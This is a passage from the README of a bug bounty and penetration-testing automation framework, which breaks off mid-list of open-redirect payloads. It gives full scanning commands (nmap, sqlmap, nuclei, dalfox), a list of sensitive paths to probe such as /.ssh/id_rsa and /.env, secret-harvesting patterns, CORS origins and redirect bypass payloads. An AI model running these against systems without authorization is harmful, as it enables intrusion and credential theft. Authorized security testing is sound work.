<div align="center">
```
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝
███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                  O F   H E L L   ─   v 3 . 0   U L T I M A T E
```
⚡ HackerOfHell v3.0 ULTIMATE
World's Most Complete Bug Bounty & Penetration Testing Automation Framework
<br>
![Author](https://img.shields.io/badge/Author-RAJESH%20BAJIYA-ff2d55?style=for-the-badge&logo=github&logoColor=white)
![Handle](https://img.shields.io/badge/Handle-HACKEROFHELL-bf5af2?style=for-the-badge&logo=hackaday&logoColor=white)
![Version](https://img.shields.io/badge/Version-3.0%20ULTIMATE-00d4ff?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Shell](https://img.shields.io/badge/Shell-Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-39ff14?style=for-the-badge)
![Stars](https://img.shields.io/badge/Stars-⭐%20Give%20a%20Star!-ffd60a?style=for-the-badge)
<br>
```
╔═══════════════════════════════════════════════════════════════════╗
║  7 PHASES  ·  23 MODULES  ·  1410+ LINES  ·  FULLY AUTOMATED    ║
║  ONLY CONFIRMED BUGS  ·  CVSS SCORES  ·  COPY-PASTE PoC         ║
║  PROFESSIONAL HTML REPORT  ·  BUG CHAIN ANALYSIS  ·  GUI        ║
╚═══════════════════════════════════════════════════════════════════╝
```
<br>
> **✍️ Created & Maintained by RAJESH BAJIYA**
> **🔥 Known as: HACKEROFHELL**
> **🌐 For: Bug Bounty Hunters · Pentesters · Security Researchers**
</div>
---
⚠️ LEGAL DISCLAIMER
```
╔════════════════════════════════════════════════════════════════════╗
║                         !! IMPORTANT !!                            ║
║                                                                    ║
║  HackerOfHell is built ONLY for authorized penetration testing    ║
║  and bug bounty hunting on systems you OWN or have EXPLICIT       ║
║  WRITTEN PERMISSION to test.                                       ║
║                                                                    ║
║  Unauthorized use is ILLEGAL under:                               ║
║   ·  Computer Fraud and Abuse Act (CFAA) — USA                    ║
║   ·  Computer Misuse Act — UK                                     ║
║   ·  IT Act 2000 — India                                          ║
║   ·  And equivalent laws in every country                         ║
║                                                                    ║
║  RAJESH BAJIYA / HACKEROFHELL takes NO responsibility for misuse. ║
╚════════════════════════════════════════════════════════════════════╝
```
---
📋 TABLE OF CONTENTS
#	Topic
01	What is HackerOfHell?
02	Why HackerOfHell?
03	Full Feature List
04	How It Works — Architecture
05	Project Files
06	Requirements — All Tools
07	Step-by-Step Installation
08	Terminal Usage — All Commands
09	GUI Usage — Desktop Interface
10	All CLI Flags Reference
11	7 Phases — Full Breakdown
12	Vulnerability Coverage
13	Bug Chain Analysis
14	Output Folder Structure
15	Reading the HTML Report
16	Manual Commands Cheatsheet
17	Troubleshooting
18	Contributing
19	Author & Credits
---
🔥 What is HackerOfHell?
HackerOfHell is the world's most complete open-source bug bounty automation framework, built for Kali Linux by RAJESH BAJIYA (HACKEROFHELL).
It takes a single domain as input and automatically runs 23 modules across 7 phases — from passive subdomain recon all the way to a professional HTML pentest report with CVSS-scored findings, copy-paste PoC commands, remediation steps, and automated bug chain analysis that finds multi-vulnerability escalation paths.
The core principle:
> Only confirmed, verified bugs reach the final report. Zero noise. Zero false positives. Pure signal.
```
You type:    sudo ./hackerofhell.sh -t target.com

It does:     ┌─ Phase 1: Passive Recon ───────────────────────────┐
             │  4 subdomain sources · crt.sh · historical URLs    │
             ├─ Phase 2: Active Enum ─────────────────────────────┤
             │  Nmap · HTTPX · WAF · Fingerprint · WPScan         │
             ├─ Phase 3: Content Discovery ───────────────────────┤
             │  Admin panels · 30+ sensitive paths · JS secrets   │
             ├─ Phase 4: Automated Vuln Scanning ────────────────┤
             │  Nuclei full templates · Subdomain takeover        │
             ├─ Phase 5: Deep Verification ───────────────────────┤
             │  SQLi · XSS · SSRF · LFI · CORS · Redirect · 403  │
             ├─ Phase 6: Chain Analysis ──────────────────────────┤
             │  Multi-vuln escalation path detection              │
             └─ Phase 7: Report ──────────────────────────────────┘
                Professional HTML report · CVSS · PoC · Fix guide

You get:     hackerofhell_target.com_20241025_143022.html
```
---
💡 Why HackerOfHell?
Without HackerOfHell	With HackerOfHell
Run 20+ tools one by one	Single command, all tools auto-chained
Miss bugs from time pressure	23 modules cover every attack surface
Lots of false positives to verify	Every finding auto-verified before saving
Write reports manually	Professional HTML report auto-generated
Never connect bug chains	Chain analysis finds escalation paths
No alerts while scanning	Real-time Discord/Slack notifications
Forget to check sensitive paths	30+ paths auto-checked every scan
---
✨ Full Feature List
```
┌──────────────────────────────────────────────────────────────────┐
│                HACKEROFHELL v3.0 — COMPLETE FEATURES             │
├──────────────────────────────────────────────────────────────────┤
│  AUTOMATION                                                       │
│  ✔  7-phase fully automated pipeline — zero manual steps         │
│  ✔  23 security modules run automatically                        │
│  ✔  Parallel execution — multiple tools run simultaneously       │
│  ✔  Smart phase detection — adapts based on findings             │
│                                                                   │
│  RECON & ENUMERATION                                             │
│  ✔  4-source subdomain enumeration (subfinder+amass+dns+crt.sh)  │
│  ✔  Certificate transparency log mining                          │
│  ✔  Historical URL collection (GAU + Wayback + CommonCrawl)      │
│  ✔  Full DNS record extraction (A,AAAA,CNAME,MX,NS,TXT)         │
│  ✔  DNS Zone Transfer attempt                                    │
│  ✔  WHOIS + ASN + IP intelligence                                │
│  ✔  Email harvesting                                             │
│  ✔  Auto-generated Google Dorks list                             │
│                                                                   │
│  ACTIVE SCANNING                                                  │
│  ✔  Nmap top-1000 + full 65535 ports (--deep mode)              │
│  ✔  Dangerous exposed service detection (14 services)            │
│  ✔  WAF and CDN detection                                        │
│  ✔  Full technology stack fingerprinting                         │
│  ✔  WordPress deep scan (wpscan)                                 │
│  ✔  Admin panel discovery on all subdomains                      │
│  ✔  robots.txt + sitemap parsing                                 │
│  ✔  Backup file matrix (name × extension combos)                 │
│  ✔  30+ sensitive path checks                                    │
│  ✔  JavaScript analysis — 10 secret patterns                     │
│  ✔  API endpoint discovery                                       │
│                                                                   │
│  VULNERABILITY DETECTION                                          │
│  ✔  Nuclei full template library (CVE,RCE,SSRF,LFI,IDOR,CORS…)  │
│  ✔  Subdomain takeover (10 services: S3,Heroku,GitHub,Netlify…)  │
│  ✔  SQL Injection — sqlmap (level 2, all techniques)             │
│  ✔  XSS — dalfox with DOM mining                                 │
│  ✔  SSRF — 6 payloads incl. AWS/GCP/Azure metadata               │
│  ✔  LFI / Path Traversal — 7 bypass payloads                     │
│  ✔  CORS — 4 origin bypass variants                              │
│  ✔  Open Redirect — 15+ parameters, 5 bypass payloads            │
│  ✔  403 Bypass — 5 header + path techniques                      │
│  ✔  Default Credential testing — 12 combinations                 │
│  ✔  HTTP Security Header analysis                                 │
│                                                                   │
│  ADVANCED FEATURES                                                │
│  ✔  Bug Chain Analysis — escalation path detection               │
│  ✔  Discord/Slack webhook notifications                          │
│  ✔  Burp Suite proxy integration                                 │
│  ✔  Custom wordlist support                                      │
│  ✔  Configurable rate limiting                                   │
│  ✔  RAJESH BAJIYA / HACKEROFHELL fingerprint on every report     │
│                                                                   │
│  REPORTING                                                        │
│  ✔  Professional dark-theme HTML report                          │
│  ✔  CVSS score on every finding                                  │
│  ✔  Copy-paste PoC commands                                      │
│  ✔  Remediation guide per bug                                    │
│  ✔  findings.json for programmatic use                           │
│  ✔  Organized 7-folder output structure                          │
│                                                                   │
│  GUI (hackerofhell_gui.py)                                        │
│  ✔  5-tab Tkinter desktop interface                              │
│  ✔  Live colored terminal output                                 │
│  ✔  CRITICAL/HIGH/MEDIUM/LOW finding counters                    │
│  ✔  Phase status tracker (WAITING → RUNNING → DONE)             │
│  ✔  Vulnerability Chain display tab                              │
│  ✔  Live animated Matrix background tab                          │
│  ✔  One-click report opener                                      │
└──────────────────────────────────────────────────────────────────┘
```
---
🏗️ How It Works — Architecture
```
                   ┌───────────────────────────────┐
                   │      hackerofhell_gui.py       │
                   │      Python Tkinter GUI        │
                   │                               │
                   │  Tab 1: Live Terminal Output  │
                   │  Tab 2: Findings Dashboard    │
                   │  Tab 3: Phase Progress        │
                   │  Tab 4: Vuln Chain Map        │
                   │  Tab 5: Matrix Animation      │
                   └──────────────┬────────────────┘
                                  │ subprocess.Popen()
                   ┌──────────────▼────────────────┐
                   │       hackerofhell.sh          │
                   │       1410-line Bash Script    │
                   └──┬───────┬───────┬────────────┘
                      │       │       │
           ┌──────────▼─┐ ┌───▼────┐ ┌▼───────────┐
           │ Phase 1-2  │ │Phase3-5│ │ Phase 6-7  │
           │ Recon+Enum │ │Vulns   │ │ Chain+HTML │
           └──────┬─────┘ └───┬────┘ └─────┬──────┘
                  │           │             │
       ┌──────────▼──┐  ┌─────▼──────┐  ┌──▼──────────┐
       │ subfinder   │  │ nuclei     │  │findings.json│
       │ amass       │  │ sqlmap     │  │chains[]     │
       │ crt.sh      │  │ dalfox     │  │HTML report  │
       │ dnsx        │  │ gobuster   │  │CVSS + PoC   │
       │ httpx       │  │ ffuf       │  │Remediation  │
       │ nmap        │  │ curl (×50) │  │             │
       └─────────────┘  └────────────┘  └─────────────┘
                  │
       ┌──────────▼──────────────────────┐
       │   ~/hackerofhell/target.com/    │
       │   ├── 01_recon/                 │
       │   ├── 02_enum/                  │
       │   ├── 03_crawl/                 │
       │   ├── 04_vuln/                  │
       │   ├── 05_poc/                   │
       │   ├── 06_chains/               │
       │   ├── 07_report/ ◄── OPEN THIS │
       │   ├── findings.json            │
       │   └── hackerofhell.log         │
       └─────────────────────────────────┘
```
---
📁 Project Files
```
hackerofhell/
│
├── hackerofhell.sh          ← Main scanner script
│                               1410 lines · 7 phases · 23 modules
│                               Run: sudo ./hackerofhell.sh -t target.com
│
├── hackerofhell_gui.py      ← Desktop GUI launcher
│                               Python 3 + Tkinter · 5 tabs
│                               Run: python3 hackerofhell_gui.py
│
└── README.md                ← You are here
```
---
📦 Requirements — All Tools
Operating System
Kali Linux 2023.x or newer is strongly recommended. All tools come pre-installed or are 1-command installs.
APT Tools
Tool	Purpose
`nmap`	Port scanning + service detection
`gobuster`	Directory + admin panel brute force
`ffuf`	Fast web fuzzer
`sqlmap`	SQL injection detection + exploitation
`whatweb`	Technology fingerprinting
`wafw00f`	WAF detection
`wpscan`	WordPress vulnerability scanner
`seclists`	Wordlists (required for all brute force)
`python3-tk`	GUI library
`curl`	HTTP requests
`dig`	DNS queries
`whois`	Domain WHOIS lookup
`git`	Clone this repo
`golang`	Required for Go tool installs
`tmux`	Split terminal (optional but useful)
Go Tools (install after Go)
Tool	Purpose
`subfinder`	Multi-source subdomain enumeration
`amass`	OSINT subdomain discovery
`dnsx`	DNS resolver + brute force
`httpx`	HTTP prober + tech detection
`nuclei`	Template-based vulnerability scanner
`dalfox`	XSS scanner with DOM analysis
`gau`	Historical URL collection
`waybackurls`	Wayback Machine URL collector
`getJS`	JavaScript file extractor
---
🚀 Step-by-Step Installation
Step 1 — Create the Project Folder
```bash
mkdir -p ~/autopwn
cd ~/autopwn
```
---
Step 2 — Download or Copy the Files
Option A — Clone from GitHub (recommended):
```bash
git clone https://github.com/thehellrider978/HACKEROFHELL-v3.0-ULTIMATE.git ~/autopwn
cd ~/autopwn
```
Option B — Copy-paste manually:
```bash
# File 1: Main script
nano ~/autopwn/hackerofhell.sh
# → Paste the hackerofhell.sh content → Ctrl+X → Y → Enter

# File 2: GUI
nano ~/autopwn/hackerofhell_gui.py
# → Paste the hackerofhell_gui.py content → Ctrl+X → Y → Enter
```
---
Step 3 — Make the Script Executable
```bash
chmod +x ~/autopwn/hackerofhell.sh
ls -la ~/autopwn/
```
---
Step 4 — Install All APT Tools
```bash
sudo apt update -y && sudo apt upgrade -y

sudo apt install -y \
  nmap gobuster ffuf sqlmap whatweb \
  wafw00f wpscan seclists python3-tk \
  curl wget python3 python3-pip \
  tmux dnsutils whois git golang-go \
  libpcap-dev
```
---
Step 5 — Install All Go Tools
```bash
# Verify Go is installed first
go version
# Expected: go version go1.21.x linux/amd64

# If Go is missing, install it
sudo apt install golang-go -y

# Now install all tools (copy-paste the whole block)
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
go install -v github.com/owasp-amass/amass/v4/...@master && \
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest && \
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest && \
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && \
go install -v github.com/hahwul/dalfox/v2@latest && \
go install -v github.com/lc/gau/v2/cmd/gau@latest && \
go install -v github.com/tomnomnom/waybackurls@latest && \
go install -v github.com/tomnomnom/getJS@latest && \
echo "ALL GO TOOLS INSTALLED"
```
---
Step 6 — Add Go Binaries to PATH
```bash
# Add to shell permanently
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
source ~/.bashrc

# Verify it worked
echo $PATH | grep go
```
---
Step 7 — Update Nuclei Templates
```bash
nuclei -update-templates
# This downloads ~7000+ vulnerability templates
# Takes 1-2 minutes on first run
```
---
Step 8 — Verify All Tools
```bash
# Run this full check — should show ✓ for everything
echo "=== CHECKING ALL TOOLS ==="
for tool in nmap gobuster ffuf sqlmap whatweb wafw00f wpscan \
            subfinder amass dnsx httpx nuclei dalfox \
            gau waybackurls curl python3; do
  if command -v "$tool" &>/dev/null; then
    echo "  [✓] $tool — $(command -v $tool)"
  else
    echo "  [✗] $tool — NOT FOUND — needs install"
  fi
done
echo ""
echo "=== CHECKING WORDLISTS ==="
ls /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
   2>/dev/null && echo "  [✓] SecLists OK" || echo "  [✗] SecLists missing"

echo ""
echo "=== CHECKING NUCLEI TEMPLATES ==="
ls ~/nuclei-templates/ 2>/dev/null | wc -l | xargs -I{} echo "  [✓] {} template folders found"
```
---
🖥️ Terminal Usage — All Commands
── The Most Important Command ──
```bash
sudo ~/autopwn/hackerofhell.sh -t target.com
```
> This single command runs ALL 7 phases automatically.
---
Quick Start Examples
```bash
# Basic scan — runs everything with defaults
sudo ~/autopwn/hackerofhell.sh -t target.com

# Scan with custom output folder
sudo ~/autopwn/hackerofhell.sh -t target.com -o ~/pentests

# Full ultra scan — deepest possible, all modules
sudo ~/autopwn/hackerofhell.sh -t target.com -m ultra --deep

# Fast scan — skip heavy modules (sqlmap/brute force)
sudo ~/autopwn/hackerofhell.sh -t target.com --skip-heavy

# Passive only — no active requests sent
sudo ~/autopwn/hackerofhell.sh -t target.com -m passive

# Route traffic through Burp Suite
sudo ~/autopwn/hackerofhell.sh -t target.com -p http://127.0.0.1:8080

# With Discord notifications
sudo ~/autopwn/hackerofhell.sh -t target.com \
  -n "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/TOKEN"

# With Slack notifications
sudo ~/autopwn/hackerofhell.sh -t target.com \
  -n "https://hooks.slack.com/services/T000/B000/xxxx"

# Higher rate limit for fast network
sudo ~/autopwn/hackerofhell.sh -t target.com -r 300

# Custom wordlist
sudo ~/autopwn/hackerofhell.sh -t target.com -w ~/wordlists/big.txt

# Everything maxed out
sudo ~/autopwn/hackerofhell.sh \
  -t target.com \
  -o ~/pentests \
  -m ultra \
  -r 300 \
  --deep \
  -p http://127.0.0.1:8080 \
  -n "https://hooks.slack.com/services/YOUR/WEBHOOK"
```
---
After the Scan
```bash
# Find the report (auto-named with timestamp)
find ~/hackerofhell -name "*.html" -path "*/07_report/*" 2>/dev/null

# Open the report in Firefox
firefox ~/hackerofhell/target.com/07_report/hackerofhell_target.com_*.html

# View all findings in terminal
cat ~/hackerofhell/target.com/findings.json | python3 -m json.tool

# Count findings by severity
cat ~/hackerofhell/target.com/findings.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
from collections import Counter
c=Counter(f['severity'] for f in d['findings'])
for s in ['CRITICAL','HIGH','MEDIUM','LOW']: print(f'{s}: {c.get(s,0)}')
"

# View full scan log
cat ~/hackerofhell/target.com/hackerofhell.log

# View just vulnerabilities found
grep "\[VULN\]" ~/hackerofhell/target.com/hackerofhell.log

# View all subdomains found
cat ~/hackerofhell/target.com/01_recon/all_subs.txt | wc -l
cat ~/hackerofhell/target.com/01_recon/all_subs.txt | head -20
```
---
Run in tmux (Split Terminal — Recommended)
```bash
# Install tmux
sudo apt install tmux -y

# Start a split session
tmux new-session -d -s hell
tmux split-window -h -t hell
tmux send-keys -t hell:0.0 \
  'sudo ~/autopwn/hackerofhell.sh -t target.com' Enter
tmux send-keys -t hell:0.1 \
  'watch -n 5 "grep -c VULN ~/hackerofhell/target.com/hackerofhell.log 2>/dev/null"' Enter
tmux attach -t hell

# Detach from tmux (scan keeps running): Ctrl+B then D
# Reattach later: tmux attach -t hell
```
---
Run in Background (Nohup)
```bash
# Start scan in background
nohup sudo ~/autopwn/hackerofhell.sh -t target.com \
  > ~/autopwn/scan_$(date +%Y%m%d).log 2>&1 &

echo "Scan PID: $!"

# Watch progress
tail -f ~/autopwn/scan_$(date +%Y%m%d).log

# Watch only vulnerabilities
tail -f ~/autopwn/scan_$(date +%Y%m%d).log | grep --color=always VULN
```
---
🖱️ GUI Usage — Desktop Interface
Launch
```bash
python3 ~/autopwn/hackerofhell_gui.py
```
GUI Layout
```
╔══════════════════════════════════════════════════════════════════╗
║ ⚡ HACKEROFHELL v3.0 ULTIMATE  |  RAJESH BAJIYA         🕐 time ║
╠══════════════════╦═══════════════════════════════════════════════╣
║                  ║  LIVE OUTPUT | FINDINGS | PHASES | CHAINS | MATRIX
║  // TARGET       ║                                               ║
║  [target.com___] ║  ┌───────────────────────────────────────┐   ║
║                  ║  │  [TAB 1] LIVE OUTPUT                  │   ║
║  // OUTPUT DIR   ║  │  Real-time colored terminal            │   ║
║  [~/hackofhell_] ║  │  PURPLE = Phase header                │   ║
║            [...]  ║  │  GREEN  = Found / OK                 │   ║
║                  ║  │  RED    = Vulnerability               │   ║
║  // SCRIPT PATH  ║  │  YELLOW = Warning                     │   ║
║  [~/autopwn/h.sh]║  │  CYAN   = Info                       │   ║
║                  ║  └───────────────────────────────────────┘   ║
║  // PROXY        ║                                               ║
║  [____________]  ║  [TAB 2] FINDINGS                            ║
║                  ║  ┌──────────┬──────────┬──────────┬────────┐ ║
║  // WEBHOOK      ║  │CRITICAL 3│  HIGH 5  │ MEDIUM 2 │ LOW 1  │ ║
║  [____________]  ║  └──────────┴──────────┴──────────┴────────┘ ║
║                  ║  [CRITICAL] SQL Injection on /api/login       ║
║  // SCAN MODE    ║  [HIGH] XSS on /search?q=                    ║
║  ○ Passive       ║  [HIGH] CORS on /api/user                    ║
║  ● Normal        ║  ...                                         ║
║  ○ Ultra         ║                                               ║
║                  ║  [TAB 3] PHASES                              ║
║  RATE: [150_]    ║  01 PASSIVE INTEL     ✓ DONE                 ║
║                  ║  02 ACTIVE ENUM       ▶ RUNNING              ║
║  // MODULES      ║  03 CONTENT DISCOVERY   WAITING              ║
║  ☑ Subfinder     ║  04 VULN SCANNING        WAITING             ║
║  ☑ Amass         ║  ████████░░░░░░░░  54%                       ║
║  ☑ crt.sh        ║                                               ║
║  ☑ Nmap          ║  [TAB 4] CHAINS                              ║
║  ☑ Nuclei        ║  ⛓ XSS + Missing CSP → CRITICAL CVSS 9.3   ║
║  ☑ SQLmap        ║  ⛓ SSRF + Redis Exposed → CRITICAL 9.9      ║
║  ☑ Dalfox        ║                                               ║
║  ☑ SSRF          ║  [TAB 5] MATRIX                              ║
║  ☑ LFI           ║  ア イ ウ エ オ ← Live animated matrix        ║
║  ☑ CORS          ║  ア イ ウ エ オ    (looks like The Matrix)    ║
║  ☑ Redirect      ║                                               ║
║  ☑ 403 Bypass    ║                                               ║
║  ☑ Auth          ║                                               ║
║  ☑ Chains        ║                                               ║
║                  ║                                               ║
║  □ --skip-heavy  ║                                               ║
║  □ --deep        ║                                               ║
║                  ║                                               ║
║ [▶ LAUNCH SCAN ] ║                                               ║
║ [■  ABORT      ] ║                                               ║
║ [📄 OPEN REPORT] ║                                               ║
║ [📁 OUTPUT DIR ] ║                                               ║
║                  ║                                               ║
║  ELAPSED: 00:14:22                                               ║
╠══════════════════╩═══════════════════════════════════════════════╣
║  Scanning: target.com  |  Mode: NORMAL  |  Findings: 8          ║
╚══════════════════════════════════════════════════════════════════╝
```
Step-by-Step GUI Walkthrough
```
Step 1  →  Type your target in the DOMAIN box         (e.g. target.com)
Step 2  →  Set output directory                        (default: ~/hackerofhell)
Step 3  →  Set script path                             (default: ~/autopwn/hackerofhell.sh)
Step 4  →  Optional: add Burp proxy                   (http://127.0.0.1:8080)
Step 5  →  Optional: add Discord/Slack webhook URL
Step 6  →  Choose scan mode                            (Normal = recommended)
Step 7  →  Set rate limit                              (150 = safe, 300 = fast)
Step 8  →  Enable/disable individual modules via checkboxes
Step 9  →  Toggle --skip-heavy if you want faster scan
Step 10 →  Toggle --deep if you want full 65535 port scan
Step 11 →  Click ▶ LAUNCH SCAN
Step 12 →  Watch LIVE OUTPUT tab — everything streams in real-time
Step 13 →  Check FINDINGS tab — confirmed bugs appear here
Step 14 →  Watch PHASES tab — track which phase is running
Step 15 →  Check CHAINS tab — escalation paths appear after scan
Step 16 →  Click 📄 OPEN REPORT when done — Firefox opens the HTML report
```
---
🎛️ All CLI Flags Reference
```bash
sudo ./hackerofhell.sh [FLAGS]

REQUIRED:
  -t  <domain>              Target domain to scan
                            Example: -t target.com

OPTIONAL — OUTPUT:
  -o  <directory>           Where to save results
                            Default: ~/hackerofhell
                            Example: -o ~/pentests

OPTIONAL — SCAN BEHAVIOR:
  -m  <mode>                Scan intensity mode
                            passive = no active requests (recon only)
                            normal  = balanced, recommended (DEFAULT)
                            ultra   = everything, maximum depth
                            Example: -m ultra

  -r  <number>              Rate limit in requests per second
                            Default: 150
                            Example: -r 300 (faster) or -r 50 (stealthy)

  -w  <wordlist.txt>        Custom wordlist for brute force
                            Default: seclists raft-large-directories
                            Example: -w ~/wordlists/mybig.txt

  -s  <scope.txt>           Scope file with allowed domains/IPs
                            Example: -s ~/targets/scope.txt

OPTIONAL — INTEGRATIONS:
  -p  <proxy_url>           HTTP proxy (route through Burp Suite)
                            Example: -p http://127.0.0.1:8080

  -n  <webhook_url>         Send real-time alerts to Discord or Slack
                            Discord: https://discord.com/api/webhooks/...
                            Slack:   https://hooks.slack.com/services/...
                            Example: -n "https://hooks.slack.com/..."

FLAGS (no value needed):
  --skip-heavy              Skip sqlmap and brute force modules
                            Faster scan, misses SQLi and auth bugs
                            Use when: quick first-pass scan needed

  --deep                    Enable full 65535-port nmap scan
                            + all heavy modules enabled
                            Use when: thorough assessment required

  -h, --help                Show help and exit
```
Mode Comparison
	passive	normal	ultra + --deep
Subdomain enum	✓	✓	✓
DNS zone transfer	✗	✓	✓
Nmap	top 100	top 1000	all 65535 ports
Directory brute	✗	✓	✓
Nuclei scan	✗	✓	✓ (all severity)
SQLmap	✗	✓	✓ (level 3)
XSS dalfox	✗	✓	✓ + deep DOM
SSRF/LFI	✗	✓	✓
Time (estimate)	5 min	30–90 min	2–6 hours
---
🔄 7 Phases — Full Breakdown
─── Phase 1: Passive Intelligence Gathering ───
```bash
# What runs automatically inside this phase:

# Multi-source subdomain enumeration (all run in parallel)
subfinder -d target.com -silent -all
amass enum -passive -d target.com
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
curl "https://crt.sh/?q=%.target.com&output=json"   # certificate transparency

# All results merged:
cat subs_subfinder.txt subs_amass.txt subs_bruteforce.txt subs_crtsh.txt \
  | sort -u > all_subs.txt

# DNS record extraction
dnsx -l all_subs.txt -a -aaaa -cname -mx -ns -txt -resp

# DNS Zone Transfer attempt
dig NS target.com
dig AXFR target.com @<nameserver>    # If this works = HIGH severity finding

# Historical URL collection
gau target.com --threads 5 --blacklist png,jpg,gif,css,woff,ico,svg
echo target.com | waybackurls
curl "http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.target.com&output=json"

# WHOIS + ASN
whois target.com
curl "https://ipinfo.io/<TARGET_IP>/json"   # Gets ASN, org, country

# Google dorks auto-generated and saved to:
# 01_recon/google_dorks.txt
```
Output folder: `01_recon/`
Key files: `all_subs.txt`, `all_urls.txt`, `dns_full.txt`, `google_dorks.txt`
---
─── Phase 2: Active Reconnaissance & Fingerprinting ───
```bash
# Live host probing — tests every subdomain
httpx -l all_subs.txt \
  -title -tech-detect -status-code \
  -content-length -follow-redirects -ip -cdn

# Port scanning
nmap -sS -T3 --open --top-ports 1000 -oN nmap_top1000.txt target.com
nmap -sV -sC -A --open -p <found_ports> -oN nmap_services.txt target.com
nmap -sS -T3 --open -p- target.com   # --deep mode only (all 65535)

# Dangerous services auto-checked (finding raised if open):
# FTP(21)  Telnet(23)  SMB(445)  MySQL(3306)  PostgreSQL(5432)
# Redis(6379)  Elasticsearch(9200)  MongoDB(27017)  Memcached(11211)
# RDP(3389)  VNC(5900)  Docker API(2375)  Consul(8500)

# WAF detection
wafw00f https://target.com

# Technology fingerprinting
whatweb -a 3 https://target.com

# WordPress scan (only if WordPress detected)
wpscan --url https://target.com \
  --enumerate vp,vt,u,ap,at,cb,dbe \
  --format json
```
Output folder: `02_enum/`
Key files: `live_hosts.txt`, `nmap_top1000.txt`, `nmap_services.txt`, `waf.txt`
---
─── Phase 3: Deep Content Discovery ───
```bash
# robots.txt and sitemap parsing
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/sitemap_index.xml

# Admin panel brute force on ALL live subdomains
gobuster dir -u https://SUB.target.com \
  -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.txt \
  -q --no-error

# Full directory fuzzing
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,301,302,403 -o ffuf_dirs.json

# Backup file hunting (name × extension matrix)
# Names:  backup, database, db, dump, data, app, web, site, target.com
# Exts:   .bak .sql .zip .tar.gz .env .config .log .old .tmp .sqlite .dump
# Total:  ~90 combinations auto-tested

# 30+ sensitive paths tested:
/.env            /.env.local       /.env.prod
/.git/HEAD       /.git/config      /.svn/entries
/phpinfo.php     /server-status    /server-info
/wp-config.php   /config.php       /web.config
/.htpasswd       /.htaccess
/composer.json   /Dockerfile       /docker-compose.yml
/.bash_history   /.ssh/id_rsa      /.ssh/authorized_keys
/graphql         /graphiql         /__graphql
/swagger.json    /openapi.json     /swagger-ui.html
/actuator        /actuator/env     /actuator/heapdump
/console         /h2-console       /telescope
/crossdomain.xml /phpinfo.php      /trace
# ... and more

# JavaScript analysis — 10 secret patterns:
# AWS keys (AKIA...), API keys, OAuth tokens, JWT (eyJ...),
# Bearer tokens, hardcoded passwords, private keys,
# Firebase keys, client secrets, generic secrets

# API endpoint discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```
Output folder: `03_crawl/`
Key files: `admin_found.txt`, `js_secrets.txt`, `param_urls.txt`, `robots_paths.txt`
---
─── Phase 4: Automated Vulnerability Scanning ───
```bash
# Nuclei — runs the full template library
nuclei -update-templates   # auto-update before scan

nuclei -l live_urls.txt \
  -t ~/nuclei-templates/ \
  -tags cve,rce,sqli,xss,ssrf,lfi,idor,cors,exposure,misconfig,takeover,default-login \
  -severity critical,high,medium \
  -rate-limit 150 \
  -bulk-size 25 \
  -concurrency 10 \
  -jsonl -o nuclei_results.jsonl

# Subdomain Takeover — 10 services checked with signatures:
# Amazon S3      → "NoSuchBucket"
# Heroku         → "There is no app here"
# GitHub Pages   → "404 Not Found" + cname github.io
# Fastly         → "Domain not found"
# Netlify        → "Not found"
# Feedpress      → "The feed has not been found"
# Shopify        → "No settings were found"
# UserVoice      → "This subdomain is available"
# WPEngine       → "404 error unknown site"
# GoDaddy        → "This page is parked free"
```
Output folder: `04_vuln/`
Key files: `nuclei_results.jsonl`, `wpscan.json` (if WordPress)
---
─── Phase 5: Deep Verification ───
All findings here are verified before saving — no false positives in report.
```bash
# ─── XSS ──────────────────────────────────────────────────────────
dalfox file param_urls.txt \
  --skip-bav --no-spinner --silence \
  --mining-dict --mining-dom \
  --format json -o xss_results.json


# ─── SQL INJECTION ────────────────────────────────────────────────
sqlmap -m param_urls.txt \
  --batch --random-agent \
  --level=2 --risk=2 \
  --forms --crawl=2 \
  --technique=BEUSTQ \
  --output-dir=sqlmap/ \
  --results-file=sqlmap_results.csv


# ─── CORS MISCONFIGURATION ─────────────────────────────────────────
# 4 malicious origins tested per URL:
curl -H "Origin: https://evil.attacker-test.invalid" URL -I
curl -H "Origin: null"                                URL -I
curl -H "Origin: https://target.com.evil.test"        URL -I
curl -H "Origin: https://eviltarget.com"              URL -I
# Checks: ACAO header reflects + ACAC: true = VULNERABLE


# ─── OPEN REDIRECT ────────────────────────────────────────────────
# 15+ parameters tested: redirect, return, url, next, goto,
# dest, target, redir, continue, forward, redirect_uri,
# callback, returnUrl, redirectUrl, returnTo, successUrl
# 5 bypass payloads:
https://redirect-test.invalid          # direct
//redirect-test.invalid                # protocol-relative
/\redirect-test.invalid                # slash backslash
